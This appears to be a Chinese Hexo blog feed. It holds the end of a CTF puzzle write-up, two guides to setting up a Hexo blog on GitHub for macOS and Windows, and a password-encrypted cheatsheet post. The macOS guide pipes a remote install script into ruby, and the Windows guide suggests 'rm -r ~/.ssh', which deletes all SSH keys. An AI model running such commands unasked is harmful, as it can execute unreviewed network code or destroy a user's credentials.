class="headerlink" title="壮壮可能是疯了…"></a>壮壮可能是疯了…</h2><p>通过猪圈密码解开第一步。</p><p><img src="/pics/2018-ZJGSUCTF/CRYPTO/1.png" srcset="/img/loading.gif" alt></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="这是神魔鬼"><a href="#这是神魔鬼" class="headerlink" title="这是神魔鬼"></a>这是神魔鬼</h2><p>词频题，解码网站在<a href="https://www.quipqiup.com" target="_blank" rel="noopener">这里</a>。</p><h2 id="表情包-10-块钱"><a href="#表情包-10-块钱" class="headerlink" title="表情包 10 块钱"></a>表情包 10 块钱</h2><p>用 stegsolve 打开 gif 逐帧查看，快速看过 260+的图像后，收集到一张二维码的四片碎片，用美图秀秀拼接起来，再 XOR 一下，扫码得到 flag。</p><h2 id="童年"><a href="#童年" class="headerlink" title="童年"></a>童年</h2><p>用金手指作弊通关魂斗罗得到 flag。</p><p><img src="/pics/2018-ZJGSUCTF/MISC/1.jpg" srcset="/img/loading.gif" alt></p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://esebanana.github.io/2018/05/07/wp_2018_5_7_ZJGSUCTF/" target="_blank" rel="noopener">https://esebanana.github.io/2018/05/07/wp_2018_5_7_ZJGSUCTF/</a><br><a href="https://bbs.pediy.com/thread-158896.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-158896.htm</a><br><a href="https://esebanana.github.io/2018/04/08/re_10_tls_smc/" target="_blank" rel="noopener">https://esebanana.github.io/2018/04/08/re_10_tls_smc/</a><br><a href="https://esebanana.github.io/2018/04/12/re_11_tou_ke/" target="_blank" rel="noopener">https://esebanana.github.io/2018/04/12/re_11_tou_ke/</a><br><a href="https://www.52pojie.cn/thread-593356-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-593356-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>macOS下使用Hexo和Github搭建博客</title>
    <link href="/2018/04/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2018/04/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>把双系统的 Win10 删了，改用 macOS。发现自己的博客忘记备份了，只好在 macOS 上重新搭建一个。</p><a id="more"></a><p>安装流程：</p><ol><li>Hexo 是基于 Nodejs 的，需安装 Nodejs，安装 Nodejs 最好选择 Homebrew</li><li>首先查看电脑是否安装 Ruby，因为 Homebrew 安装依赖 Ruby</li><li>安装顺序：Homebrew-&gt;Nodejs-&gt;Hexo</li></ol><h1 id="安装-homebrew"><a href="#安装-homebrew" class="headerlink" title="安装 homebrew"></a>安装 homebrew</h1><pre><code>ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</code></pre><h1 id="安装-nodejs"><a href="#安装-nodejs" class="headerlink" title="安装 nodejs"></a>安装 nodejs</h1><pre><code>brew install node</code></pre><h1 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h1><pre><code>sudo npm install -g hexo# 可以加上 --registry=https://registry.npm.taobao.org</code></pre><h1 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h1><pre><code>mkdir blogcd bloghexo init</code></pre><h1 id="生成一套静态网页"><a href="#生成一套静态网页" class="headerlink" title="生成一套静态网页"></a>生成一套静态网页</h1><pre><code>hexo generatehexo server</code></pre><p>在 localhost 的 4000 端口上就能看到本地搭建的博客</p><h1 id="撰写博客"><a href="#撰写博客" class="headerlink" title="撰写博客"></a>撰写博客</h1><pre><code>hexo new post &quot;balabala&quot;</code></pre><p>‘balabala’即为博文的名字。</p><h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><pre><code>deploy:  type: git  repo: https://github.com/xxx/xxx.github.io  branch: master</code></pre><p>直接在_config.yml 中修改配置（xxx 为 github 的 name）</p><h1 id="安装-hexo-deployer-git"><a href="#安装-hexo-deployer-git" class="headerlink" title="安装 hexo-deployer-git"></a>安装 hexo-deployer-git</h1><pre><code>npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org</code></pre><h1 id="同步-Github"><a href="#同步-Github" class="headerlink" title="同步 Github"></a>同步 Github</h1><pre><code>hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</code></pre><p>这样基础的搭建就完成啦！</p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>github</tag>
      
      <tag>macos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows下使用Hexo和Github搭建博客</title>
    <link href="/2017/11/18/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2017/11/18/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>记录下在 Windows 下搭建博客的步骤。</p><a id="more"></a><h1 id="下载安装-git"><a href="#下载安装-git" class="headerlink" title="下载安装 git"></a>下载安装 git</h1><p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">git 下载地址</a></p><h1 id="下载安装-node-js"><a href="#下载安装-node-js" class="headerlink" title="下载安装 node.js"></a>下载安装 node.js</h1><p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">node.js 下载地址</a></p><h1 id="github-账号注册和新建仓库"><a href="#github-账号注册和新建仓库" class="headerlink" title="github 账号注册和新建仓库"></a>github 账号注册和新建仓库</h1><p>仓库名必须为“账户名.github.io”，勾选“Initialize this repository with a README”</p><h1 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h1><p>通过命令行输入</p><pre><code>npm install hexo -g# 可以加上 --registry=https://registry.npm.taobao.org</code></pre><p>注：-g 是指全局安装 Hexo。</p><p>再输入</p><pre><code>hexo -v</code></pre><p>检测是否安装成功</p><h1 id="初始化-Hexo"><a href="#初始化-Hexo" class="headerlink" title="初始化 Hexo"></a>初始化 Hexo</h1><h2 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h2><p>根据个人爱好在本地创建博客文件夹，用于保存博客的本地文件</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>在 Hexo 文件下，右键运行 Git Bash，输入命令：</p><pre><code>hexo init</code></pre><p>初始化成功后生成的一系列文件，再输入：</p><pre><code>npm install# 可以加上 --registry=https://registry.npm.taobao.org</code></pre><p>安装所需要的组件。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>在 <code>_config.yml</code>，进行基础配置。</p><h1 id="本地浏览博客"><a href="#本地浏览博客" class="headerlink" title="本地浏览博客"></a>本地浏览博客</h1><p>分别输入如下命令：</p><pre><code>hexo ghexo s</code></pre><p>在浏览器输入：<code>localhost:4000</code>，就可以对本地的博客进行访问。</p><h1 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h1><p>在博客文件夹下输入：</p><pre><code>hexo new post &quot;xxx&quot;</code></pre><p>即能创建新博文，声称在 <code>_posts</code> 文件夹下，或是在 <code>_posts</code> 文件夹下，新建 <code>.md</code> 文件就可以写文章。</p><h1 id="ssh-设置"><a href="#ssh-设置" class="headerlink" title="ssh 设置"></a>ssh 设置</h1><p>在博客文件夹下打开 Git Bash 后，分别输入：</p><pre><code>git config --global user.name &quot;你的名字&quot;</code></pre><p>和：</p><pre><code>git config --global user.email &quot;你的邮箱&quot;</code></pre><p>输入：</p><pre><code>cd ~/.ssh</code></pre><p>再输入：</p><pre><code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code></pre><p>连续三个回车，生成密钥。再输入：</p><pre><code>eval &quot;$(ssh-agent -s)&quot;</code></pre><p>以添加密钥到 ssh-agent。再输入：</p><pre><code>ssh-add ~/.ssh/id_rsa</code></pre><p>添加生成的 SSH key 到 ssh-agent。然后登陆 github，点击头像下的 settings，添加一个新的 ssh，将 id_rsa.pub 文件里的内容复制上去。输入：</p><pre><code>ssh -T git@github.com</code></pre><p>如果出现“Hi 你的名字”，说明成功了。</p><h2 id="假如-ssh-key-配置失败"><a href="#假如-ssh-key-配置失败" class="headerlink" title="假如 ssh-key 配置失败"></a>假如 ssh-key 配置失败</h2><p>首先，清除所有的 key-pair：</p><pre><code>ssh-add -Drm -r ~/.ssh</code></pre><p>删除你在 github 中的 public-key。重新生成 ssh 密钥对：</p><pre><code>ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</code></pre><h1 id="部署到-Github"><a href="#部署到-Github" class="headerlink" title="部署到 Github"></a>部署到 Github</h1><h2 id="在-config-yml-进行配置"><a href="#在-config-yml-进行配置" class="headerlink" title="在 _config.yml 进行配置"></a>在 <code>_config.yml</code> 进行配置</h2><p>···yml<br>type: git<br>repository: <a href="https://github.com/你的名字/你的名字.github.io" target="_blank" rel="noopener">https://github.com/你的名字/你的名字.github.io</a><br>branch: master<br>···</p><h2 id="安装-hexo-deployer-git-自动部署发布工具"><a href="#安装-hexo-deployer-git-自动部署发布工具" class="headerlink" title="安装 hexo-deployer-git 自动部署发布工具"></a>安装 hexo-deployer-git 自动部署发布工具</h2><pre><code>npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org</code></pre><h1 id="发布到-Github"><a href="#发布到-Github" class="headerlink" title="发布到 Github"></a>发布到 Github</h1><p>输入如下命令：</p><pre><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>第一次发布需要验证 github 账号。浏览器打开“你的名字.github.io”，就是你的博客了。这样就完成了简单的搭建。</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>hexo</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF Cheatsheet</title>
    <link href="/1970/01/01/CTF-Cheatsheet/"/>
    <url>/1970/01/01/CTF-Cheatsheet/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="47f6037df334171e4582886f4c35ddf1326b61c5b73aafa0fff01ea25bf74d79">33ba61e20bc39ad8f18bf8924202a015889adb009f73bedbb4c257e3759f48060681934b256d34c10c21816903d0fde692e1647ae06270bc6205f60e892f1906e2f695fabc2b076e0287bbcaca803b892ca7186b05a0a7b2739731b060d51741497815c1edd7e6acc8bf8f758259bb7e7eb071b4ab12ac93ae1efc0571e8a36c9ecdaf99c04fb5bbdd53542b97dda8f573fb46574cfd421afbb358ac826ca61e39dfbeb1d2d8137653c47f495a12635d8c1b990b580b6c220cdb29faf4c87d593d1ee482b2ced9768217d1a4710cc781917410763075dc6556f4d4bab0684a809d0c384b99f4af50568e0d493c455c7d55520f50227bdd2cb4a4ca27016bd182725c57ef99c2f08b50467f7c0094458d82273e372be8a85e41ea82893e80bd62ef4fde16289b9126494c6f5b73d9297d826277cc1f4a5dbbcc7c341f6fe2a7c11ea804858bacbbfb217b33fe75349e1d620f5dd39e6367f1babf0c9b751cf085018dacd7e5804f92adee53d6519e5d8676ec5704757b78fd3a57b7b14dd818a789763064d81ce16f14357345a10b503b49c90fa4457effafc09324dfc6933c49e77111f74b5d35c8831c874dcf216593c6d933f894e28aebbbf8d15b4b77a4fd3e10b7b150e871354b204418d69db45866d4a2d1f95ef8ad1a23858338c9add140601693ae24eb6ac5b0da7e5d2539c4a3208157582a019b20ae362c0b4bea9fe245df5db5de8dfb0c9ebfe25de9688ec87d379342543bc001a4fcc2a02c303029bdfcef0e93dab9afd7b46e49901b1c95210f4aefd284706b5132d8c45f5d82dc2c24d7ef74ae35499b315d2e06b621e37a24856c482b235e4c78758673c45ed6b3f29c6f7cb1d6ce430540544ceb9bc7a96f7528fe6d9df729cddcb1f1aea346594ec081399924fc72abe6e25188bc220140d664ca542e7958b5de9c52dfca1c2f93e48a8267174c18eb3d84fdf1f94dea7a874dd58954cab258ebb9c9d771a0b02e2fc163260fc010abbed7b8aa566f3e64d63de5236643fcb9e3467efa09e5ace1f6b6221774ca516e5d9799b7c4705408825f16df8916754411eaba1d0fb905eb1fc4d15f6c7684abf476b511fe7297f9bf69f300b635c18a0c95d7235aa4c45f3de1d6c1ef45e8cad45f4c15bc9ed0438e6f7c13f509fa9ccd1457059f73800add976d671350c21fc17512b709c75df3fb36f0a1f844820c3b3660f4e5cf560d5e27aa135f283091a97811b87f09c452db3d963d7b067ae288c0d154ae144497d956edf948b4ae31e397ef2135a9770881ba04983833b9381a21b368becd6111285d6b557f8d7d097d7527550c58f35b37f17c6ef0ab3087e804fbc8827a8393aef2b3261de298649fc315403994a5c4294d67463102122e29a526000d5a878e42071664e3a3c9337e4d1faae7c54691177300f6892ee9dd9c365c2747900a777f819347d4843503d72fe70ad187b3fecbf7b4ff57faf79be8907f9c50884f7ab5223c919ed9cd58496eecbb1776950fc243887990d8cef3a9bcc9b4a40cc398af8b4680d21fd1253f76c22eee114d6a8bde1253bdfee40e189a0f72a1a32eb461836b8e93134e5f9cc25a0b6fef8154443fd6cd1c2997431327d10ded3af4d8ce80c5db6fabdcbfc13be2be5bffec4ce029903eba1c3bb72ad4576b4f82d36cf8f220661eaddecd3e232eb442db72bf45eb6b1d23f69b66f3e6e5c8136fed888948d6dc1fbdab80e4ccf928ad80480710383c8754555a6d059c5a695c4681cb61fa4a035c05700aae5041e446593fc4d2c9ae791ca7b7b74e43474c92c5b9917d7dc3f987cfebec26cb755e59340a42a7cac7e4298653def3c270178b74d4b8a7686802b2181873e3a6ab96baaae5e537d471edec86f31d84be013ca9d7a49d2f3a311bf3eb54dbc03fb8a7a77a6e3b477c08e8f49648669f3488fa30887e2d42d7cfea52b891966e7126c5f9eb24a7805a330506bec9c2d48677ba0835b12bba52eea3a7d545143ec77fe788eb3f52c0e085bd18878860ef391872b231ae84fcac96bdea4c431b50de5ccc935a48e7ae712f935520875b388e8d3602c331a35d2fdf2e860385a769cc434f1969d0e6967c502565d54d16b24763437d00a8fb9f904f6123c1b23376c0ac4dc296866872892f6e68a812b8a13372cea007cb577802b950fd7e00ffcf56bc05ff1cbb93e811c8122de078524df2087a10eeaf548ddeb0bc67503af91684219386aea61aa90869bd3a594a7c17cdcca43561c2228603a1a2cb6a6a7ced12aef27f9ba8e9c74cec496102b8b0f5fe102e90a63a9eb2f7a88f773adb5bbccba09650dd3c847a256366d961bb41b58c5f19c2873eace3c38c653582b87923660a4da064fd9ac0c9723f5bf0c9018686c85ee82b11d4e7b841091d0e883ff7eb36c0a24d852fe3dedda2e93c32fe80c71f73f6e41bd2fc5130ccbc74387cff94c5fab359b3784c6ab039498a0a4929c9b5bb409b8c4778ee678b341c1428675ce9766cecd0127d6e239875e8f0a2202a459596fc8389d1388b0e9cbfbac912ecaebc707f02b3c29982de1c4319516448aab50d692ca7cdcf655658b18a9e2c647aa3575eac9a68c148d8c1cd5118edc58484dfa77066c3b62bf7495038f7d44a47eb3e04d802db37c0e40833e8dd6c9b55dffece15f32fb72bd201ecee05b1975194056c112ba3abc26e238f262b3465ae584b2184c48037f75bee0b23bac4843877fff36702e4001aff9bcf4a1c5106e4afb31d7c8341701292437b97c4060d970fc5d44777c68b11fa58152f180ac25d8d17d13a8bd19e3eb9d61f5b0a200f93a1482aad76c35651583b38b574a6ed3638bf20e65ebe5c957985689cd9cd3632d49efff5a88dd4740def1ad2e6cc258d5da24255d07b091b04e6e28f48be5da5d35278c3f4c87c41220bafa9e196d0bf0e6b0513f7e11b3983d8c4872e07aa572a08cf4ecfead7265f737ecc5a45bb17b885f9ac2ab1a2f319ffff8b25a964d42f39db9fe71126ad16aacf615e267381d711d64eac479f06ef2f3bee437b44940bde0fe573754abfb5bfe68bd84556a0b0939fa02db77504cdcf16716073906214acaaf9d0414778f02977385e1737fd2703bf5c17250b621e06389b94c0b2dc0f18a45f149b57798d9cfe124f2f8e3430c3be5e5d16f960d94759d2259eb99400264de58da615fc25c96081c240534df006496ff474c8df078cb85b57ed930bce2b46c05ac4178f292f440f0507844ba07ac8d109df02ef7fe546726feedc8ff8c498298feba483e44ee8ce9e4dea8f669427e647e8bc38595cd22bfd07850bc73c05fa92dd7ec69cff209e1e6606e5cbab0dba742107502f0fe31ca56b25b36ff3dadbf02f5de0c92e8000bf1550168a9003c61dd0353df0dc5c5c05ff2abb06ee56bfa1f309fbeb71d9ce481183c660470f250aebe30e4b2f2a7ad04f34437d47209fcc0b3459ab18a5032e42253f8813a22da056a7e6e27161c774eef6a1cb6c5eaabf74131a1def3f34286b103e9aba4b367e99a8b085442a96160b306da7fc03d3cc483459e2112d4ab85437c38f04565c421e9dca170691d3203785a8eaa83955c95ff52ccf039903ba0dabdca8bf69cb3460dbf5e841e70c63423a3bb22918d25042cc06f2517f8f6e25a037d882c1dc13e44cc83321d5121574aeee2e3f60657eaa65677dd7232efec3887471f211bb6c41980850251c471dfb65ef3ef56291aa8cd890922b3c6901bd289264818c7eef9f9254030ad765839c8d9f2ac7ab8ec723c5b487bb34f61dc8420c5007a933820e6a57bdd2f4ddb7a55c26231c4745bf70ac89e9b49e83429fee36cbe49b83df3d667233c113b5aa3852a236ff5646f0c5606d6c1523909b408f56f2dc37b5b62aa32d14dc62b5f4404c85dc5d3ca460fc466cd9b2498072460405a88b00ef3879847ec2568680a667f525f7eea835046fc9738b2a865055fd08ec7349aebb616db87266d600adbbcbe1ee9d07380c2d044be78f4b0dc234a36dda66f07f54e503cd093c4b50137c04fa2e2b35a6e5c7082386d1ff758245779bf283442a90a0bfcaf52cac42c42a681de8c2072fc5981dc593d97295544e40b728609c14f5ce2e8503bf43ddc9150cafe30886880b85481adcf8345604292725f6285825f5afd4462ed23093e54a7ce64d06fc621ae0ee721fd7e25052186067a043d2d89c1e1b1d71a720e98fb6ef7b0cdda0fab8fb3ad82eb9d373b75e1c202525e1d1425237d09f04cf96c18ff8ca6e5c80eb387bbd636014539f0bd7dc1a2c86921cbbcccea87300a1dd1d9d8d7f1041e95a2203aa7be76d4192da13b6fe0afeec752148109844b75dca05f57859dac5364ef4a6e51294f0d8b6d3f0cc5aa48176812de85cd4f17b9d11d9a19363080a2383e9dff1e4882d0e9970702747aeb4a651115c051ea2a296dac3dbc4d9b2912d06a8628d1d90ce44cb0f3b02f5ab156807660c94f77438895343e0608d92e545e603eba3510019f2ff47dd39f0aaa0b70cfa86e13ae427b4c0aa96684e7488e37e95b16da521b8fde613dd35bfca594174b84f7c6c0054bf51227606b9fa526f6380d47038326e2b7aa84fd4cbb7e0aa455cc98095e32c771046ce4dc635dbf59b99da22b515eb34cb01852b190627dfab9bd927e18f641096ad214a9becf7e64b6b9c597b25de4f0256ed32dc64caa5fcbac2de3039f05c2709ce2c3d808ee3a0418ddb1c5082e8591100260e937fe05a2e1cf254b3d0f8ccdc99d7050cb2a09ad44a5600a4eaf25750bea31f6cdc0a58bd58616dda1f4206b539486e3a31963a25062c8459af27acbf65463cfe7eb95c70c2fa800742137cc58dda829a5546bb477a0b69590eac48b66978a6b013e8bd02e9bc8b9c3fb289646d7c2e0a52965f96a8ffe06bfcf5f2dcebe59282d57bfef6d8b99b73ad0315cd3a9ad885b8100068766262bb392e938051a3ef0eba07b39b2d9b4987de83a4bb27579bb58ca3a8ea0e9e5a973af3ea5532afb7186e7131d2e978e7813519c76f8c7f2f139673de47056412529be7c3a0b090363f4d26df2a1483a75817da36ff2ad319ebab18cc7890f3b40efeb607b19f5c51858623f1fcf848879bc77448414a4c84fe14748b1115d45ec24ed4cd92c3fd532f4cb096a9bb37ddd785a741390b760782c72e7a0d101ff12b2f8922ea680c9d66a9268ac65e2f5ef075e51a5d663eb8c65a96bcd93e5524a7ce9eb9ab5798bb9447f90dcaf49a9d051c10400092ce67c6bf6ee95f38a33eabd0d6dc432e246aab875f8f171e633997fede247aafdd676f1d6a12f71912059e03e902b1556450c0215c46a245e751412632d93771fbef94055c8e4fd2b6a3855380357b465e7088175a2db74150e1109d5ea78b1920ad96701bef80473c8f17dc60bad1783e9b24f08815f058928e08304dcbf107606315a5547079d13009afe011941ada83446f85418331a0956f4ff280ef3016194a44ceb2baad8dab60cd82e13977ba2c526709d0692a650f7f986f3fd3d7e67847113582d7da5a94fd7b9db9dd5d2cf9b5aa799088a038ac0f581fbb221dd5010e95a564ab31796d68f663f2a2e6e9a228fb6092d1607a6a226fb2390ad7f6bba8273e5a17aade53b89fc471089f0afc509aac9c21f7a8fba6c61e568df52973e19c3c0f06393492cb5f70b01086c588bdddc46e2d2c21f9a0deb2aebb6cdc0b04771257d56a0144a728c469f24e6c542e3a7c9321e62487260d0f13550e28daba5eca492e8924ccf9907633fb229a5524a798dede61de83789eeb076e29c71cd910aa27b6d0d21d122b9182d954a4ee3f826fd9ac0d0c5bb53682a31bb2bc109c0758b197ad89208ab3b4349f33c03e9a5558b7f62d59d08dede1203c249c4dd19208b396d455cb9b19162613dfd66470ca98c6eae2a3331e7578da06c1299bfbbb201455a5ff4675fc93f1be18849f0fc6b80dc102396467b44d006c9d6e32ecac7c12edcc2751c1e9eb4ada092e1400c450da7fbe2bde72077b466d3ccfa80cf7b5a915c72f00b6a84d3105030e556e875b67889689c469e5a719840c5b3c43803bb53864ca9d09ad3ed1a198bfc6e606e9d1c0f71e1dd75975fb1ee3d8f726515711c6cf00d3bba2234d57a075ab7fdc7dddd38e790e937f95b1d60ddf9caed77b11b622707ef8aa1d3feb5b4055ceabc94e997f44d03ba12aac77de53a132a50708365b9ba383156028fe3fcf8d5bc6e3a45ad7566e2748b516979a1a202411ca9004cea76c5f3b6089f07abc8e427a0bc4283de4d66a2949465bec6d26ddcb695d7878971dbdd5295790dee40fc1663fe3c70abe857c8c9f863e11cded106a4f67747a798a909c668653622cf08d259d0840e2244696e0cc3ed61ee5190c854a16ad7b50962eb9d2ffde8e4d8fecb5ec2ed7099e9cabc43b15823e0aad85959016d0d24a5f9a98034458ca01bedf844959a6ea84f1f9ee72a5a55df3e187e78e0b926ce6ca5a6709dd4395b4790dfc2c6b684dd7cd0618dfa79deae47f616c1bfcd6d198082eb4a8e177b4236926325562a217336e0deb9f8f94dbe43ce6cd7708b8a86447c4a3474f6a4467c1c3488e9a22525907c10b5e63032d00151e4520a535599f0e8a60194b61a747820386022934ac2767c9ffe893daddaf3717b8d3b1b3381d1c0c3cee46853a544eadbf3556d8db063f5a70b31d224ef5db2949ff3125807ef72f2490ab1e2e7043db2159343b77b5dedf861ca9f10e2ec08f061a2a11f5940be54462668d454b58347647a9b677485ee2561736bbfca8ce2d48c7fa83897b9c71e2818a01a36b5b44bd0dd338ff2fd10e624a9a95ac7840fad449013b4194721929d85fd659b6b37714ceb777625ddd754361a65c6f8a1113a70925e0753d42bd614ebc9526551332bef73b2d4453f33ac49963a7b9ce472939f75544f39ffe63e8a379f21b663a72fcfd58101a0460bce6cd633cdffcc781b817046b64a2191e15705b16b0571169c2611e3bc506401cb154403cff90c1753c3036f55dd46fc18f32c1f444aae01ce22aa84a9f483f1f83d831e1a60b48015ad25d34f1880fe1271dd7d77609f133b8a02af6d4a9e9d87206370440329d5bb8c1a7a1b1c88a40b85bf3cca84bb0bd0a8f3a0e47efbcdbd3136d4175386c2bc1a60fff4000723ea5a955e91428dbeff7674e1edd1c6acaa36dcdc3908da55cb3f0d9dba7a7f37912de49078144ab3f2b2999b12d2585402c91b0abd91d3fdb31c0caeeeb9f95333e9ba2d3bc2277a0a76f5d73a3192ebb600449a6f48a48c29b1ec7ffe79120c0581c46fd17fb728fd7ea819f12c2f7ecdf48571f4ef6a0b7e226305923e6e85bdf24d57568b6cb3d50b3869051d48262dee817c14f10d7c179d306e85fcc15f3f0fadb7df6d1bcbf28ff5757a640f0be2df68d7a2cae0e20703de74615537060b0f15d6f4203a4702878955e73f6911f15940dabd3782c4941de73fdc6209b3912e68b1a48fb09e8de0d293177ec235057bb9a9047f4c69708ccc241a6bfbbf66d3f5c85908becc83d4a4ed85ac7cc132363b2fcfe3171abf439e672cc64fa8134242fb71dc09ed9b12e1c925ded4468f5df92240b9afa509db52b9751abbcde9af05f089a34457b63a6ca1ee9959ca9bba6f1c90b17f93bbbe553dc8d18c5fad726d0025912fb59f41ba1598cf4d12f63d344441361b549f7432d3835e5899ffd4a96619f9c89d222345268a2cfd088f99ebfa4d58f9ce028a1f579736d1fef063b47cf19ab1ae91cc8e349f447ceee0947c330b0ac3fbfd58b100b78b47efb01eee6324c7d8f5bc619502139527a0c30cada6c3bc70445b36bc864cc26250df826de61a37b663139793750c336d493384b25efc02826080992e7fb94b740166b4b2a1f0b7d28406e0e01bfd38f7e71c098902bd316c0ab4f57538880c80c349aec6aee6144cf7363acf86962d6009792b8602e00b80920d2bde99fd5ca67ce6cb315553373e0e79f6b0390c5a1f5007657b218fe2a37c6784e372d31bb5bf68a129e1a8f7507026b2006b10319f4461630f879d2d453e76b24640882ba2683432f7668d7e70288b41647ef09e529531e60733389af4d46bd976ba08a787c06a5e993fb166ebfe389e9571adf232368bd28bca0a85bff622efa9f409b6a027a80623eb8d21af5ade8f366637ff674efdd71a40e38099cf7c8590cf4c0fa630fbec11dcd69f05098f73a587ffccee349cfacc7e63b6183d74111dab9e3da57daf67027fa0637f180dba2886db0534c86f37a8c1005de5112cec337f1494cb4cb8b0930f359352928696aedfae62a4559d906db274050f4da0d1199a6e4666535509400164e7efd3fc34a773d39389fb20423d5dd0abeb77fa443fa8e5e1036b0e6da5d06c3cf996108508e8ba3b74c385b7a1dc1c10159a9bad0b2206512c64c6179e6bc67f1e9460913e3489c5da8f671846409d308db99b26987de73c7de14198a978c86a42d3d022bf381e988058b399db3f9452f8f25aa2c501357b0a3600285a456b55253aeefafe73c0335deaca5b3812859b96a305b570bd831ece4d8fe55ad8703946f614a4590ff6c660fabdae966d9d8c190c0e5e4951e52cc702165e3feecd12e9f5544d6a30cbb1760588b003dc807f171ccd404603911685c5661b2bfc03afec4e8729b43cb3b75b666be35ff0c8cfc3ba3968201eb48d5cc778be915dc13c6a62f9c63007d9b0ea548171f9c766c035a31bc0e2966b5a881dd7be1908ce2f449ec97076771b1b594580187893d48f7f908ecfb5d3475f2c9732a16a80170a9ed27748ed52e68543717444c8b8559786ff34d6eec936db3a6bbbc65059d192cc6d9b613dafef06d8362389caf598f950a6a4db2654ec2d3e68827c6d51c1bed4fbdec28daec1f0e225fcb20d4146a4806258bd4ddf51ffec02028c74dca818b1fece4e82013b48e38da0186c876885c17251a6415a10c5b0de0d21a7c98085e71e42d3cf2ac9abf62583fec3512c0ac8bfa28bd39387d09dab20313d7ccbfe8ed16b1832d33dc168f836db243876bdb493fa885eab6278bb8d69060b5cbaa5625f64d73239bdb601944393548201b83f5df782f3fbd903b48be3c9762b171211b1bef63209dad215e84891c5b8c314b07cc7b5a59086254a8468e3f788254880657fc7caca2910c374764811b94d989c11d861e100efee82f1517a8958811c93a36ac90fc801b7b1d47d99d72ccf1a115876c87afdd984c0b31aab1f2df87d4e59129a642cf5ec0fcb0da26b66e4de6cf9052b5db05d638b44bb2742d4b2c94d47dc38fd6a39835fe97bc1c5ee93d31150f0027a2bac0e32e7d1cf69234756666b96053a35e8ac518aaf3566ac1fab7f42b70130a4cc4ce5535efe4c5785068c9a1fe32f9b6c5528b848c87ae68b000f9dd2eb50181ecb6afbad82502ad87ac6cbb05b829b19d74f76c34a79beb9a8b0e23d4f85841f6c56dc3a0c0075467ea23e0596b60bf84e9f58433c455682fed28fd7b42d993a913f6b4ad7f5949ca7758548bc90342c4611cbf2c9deed4c63b733afc98dd9a84b3fe902aae868a97079b1901e0eeb04714aa28b8001da743f909a1d9a9bcf64ea45a2e71188286e10e88581bd5317bc68546b1da09d0f9ee5950e175aa913fb7d57a2c74f32566df85a22592d2db2eaeea5f87dd7cdb02c1cc11e7821a3a89cc09f8d65d5588b2b976d8484ec82ef4a4adf00fb05e5bc993b1e972152fcac3e7ade193bf46a5154b0e2c6c065c3b3120102bd2089ea3ec529bc6ee892fed55e6b7266ee2ff2050f8be1b776066e27aeebae48c9334a31806ebb85aee1f00a69c033f193087319675842ffef94522b046af60fa078a8f5fa1151d60de337d5162a0efb406e6b9f4e5acd7e010001dd32ddaa5d37faa5d7e940599d1f0f76daf86402c99560d36d0bf86b8d1d4eb9d45cbeeaa5aa19ac78ba1deaacf565706368bf9dd2568b8dab9d7043c045c702dcb7965998c2e6758355282dad852563546636786e212e7a03400ea0a1d63881e586ba7d135a2fbe03fddb8f46933a7dd3233a23b33b6a2b95986fccbea6dc83baca3b061b82582793cff2fb73c7a9d7d80d72913a17041858525ef53c8e7222c65d572b1cc908175865814137f599486cf5d06b86274c0d28282938092e3991c128cc8cf7d326d6f602791d695c8f097d03af6498ce039d003d4d35563558902f403e7e2caeef6361f00161ed0e710da90a13a5337180cd375c5fd80248d0b301178ee767df0c70a041fa05ff9fbc67ea1986ee6faea295493468871f24675636c94eaa6591d4790e25cd2800fce5a8187a0584f61198102c1c5d6effc4e34de6e1956d2db85cfd3dab0ec9a9767f6b84a4a99d3b987526ccd7b4d1586bc56d5f8b779f131cafcbd6b59e